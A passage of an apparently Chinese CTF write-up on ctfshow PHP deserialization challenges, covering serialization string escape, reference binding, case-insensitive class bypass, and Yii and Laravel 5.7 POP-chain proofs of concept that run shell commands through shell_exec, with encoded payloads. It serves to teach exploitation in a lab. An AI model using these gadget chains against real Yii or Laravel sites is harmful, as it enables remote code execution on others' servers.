single-quoted-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";&#125;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>f<span class="token operator">=</span>aaa<span class="token operator">&amp;</span>m<span class="token operator">=</span>bbb<span class="token operator">&amp;</span>t<span class="token operator">=</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string double-quoted-string">";s:5:"</span>token<span class="token string double-quoted-string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在向index.php发送之后得到回显Your message has been sent，然后访问message.php（记得Cookie加上msg）得到flag</p><h4 id="web265-引用"><a href="#web265-引用" class="headerlink" title="web265(引用 &amp;)"></a>web265(引用 &amp;)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>如果要靠输入的 <code>$password</code> 去和 <code>md5(mt_rand())</code> 碰撞，几乎是不可能的。这里需要用到 <code>php</code> 的引用，使得 <code>$password = </code></p><p><code>&amp;$token;</code>，那么 <code>$password === $token</code> 就没问题了。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload：<span class="token operator">?</span>ctfshow<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A12<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowAdmin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>token<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BR<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web266-PHP大小写"><a href="#web266-PHP大小写" class="headerlink" title="web266( PHP大小写)"></a>web266( PHP大小写)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cs</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshowo</span><span class="token operator">=</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error <span class="token interpolation"><span class="token variable">$ctfshowo</span></span>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong><a href="https://blog.csdn.net/qq_41445224/article/details/88890323">file_get_contents(‘php:&#x2F;&#x2F;input’)</a></strong></p><p>在用php写接口的时候，通常会将请求的数据通过json的形式发送到指定的请求地址处，此时的file_get_contents(‘php:&#x2F;&#x2F;input’)<br>主要是用来获取请求的原始数据</p><p>其与POST的区别如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token variable">$_POST</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>“name”<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> “zhangsan” <span class="token punctuation">[</span>“pwd”<span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> “zhangsan” <span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>php<span class="token punctuation">:</span><span class="token comment">//input-------------</span>name<span class="token operator">=</span>zhangsan<span class="token operator">&amp;</span>pwd<span class="token operator">=</span>zhangsan</code></pre><p>只要序列化ctfshow类让他反序列之后触发__destruct()函数即可得到flag</p><p>由于过滤了<code>ctfshow</code>但是这里用的是<code>cTFSHOW</code>，在PHP中，类不区分大小写；所以绕过了过滤。</p><p>这里涉及到一个 <code>php</code> 常识：<a href="https://www.cnblogs.com/zrp2013/p/3607581.html">PHP大小写：函数名和类名不区分,变量名区分</a>。</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cTFSHOW"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xxxxxx"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web267-Yii框架"><a href="#web267-Yii框架" class="headerlink" title="web267(Yii框架)"></a>web267(Yii框架)</h4><p>弱密码<code>admin/admin</code>登陆后，About界面发现注释<code>&lt;!--?view-source --&gt;</code></p><p>于是访问<code>index.php?r=site/about&amp;view-source</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token comment">///backdoor/shell</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>搜了一下知道是 <code>Yii</code> 框架的反序列化漏洞。</p><p><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii反序列化漏洞分析</a></p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cp /flag 3.txt'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这里 <code>system</code> 不能用，用了 <code>shell_exec</code>。</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">%</span><span class="token number">2</span>Fshell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6MTQ6ImNwIC9mbGFnIDMudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h4 id="web268-270-Yii框架"><a href="#web268-270-Yii框架" class="headerlink" title="web268-270(Yii框架)"></a>web268-270(Yii框架)</h4><p>做法一样但是需要修改poc，因为存在过滤 </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Action</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DbSession</span> <span class="token keyword">extends</span> <span class="token class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>BaseObject</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此处写命令</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0<span class="token operator">=</span></code></pre><h4 id="web271-Laravel5-7-反序列化漏洞"><a href="#web271-Laravel5-7-反序列化漏洞" class="headerlink" title="web271(Laravel5.7 反序列化漏洞)"></a>web271(Laravel5.7 反序列化漏洞)</h4><p><a href="https://blog.csdn.net/weixin_45678034/article/details/122292624">Laravel5.7反序列化RCE漏洞分析</a></p><p>空格被过滤注意修改最后的payload</p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">,</span><span class="token variable">$class</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span><span class="token operator">=</span><span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">attributes</span> <span class="token operator">=</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Application</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$hasBeenBootstrapped</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindings</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindings</span><span class="token operator">=</span><span class="token variable">$bind</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$genericuser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"expectedOutput"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"expectedQuestions"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$application</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token 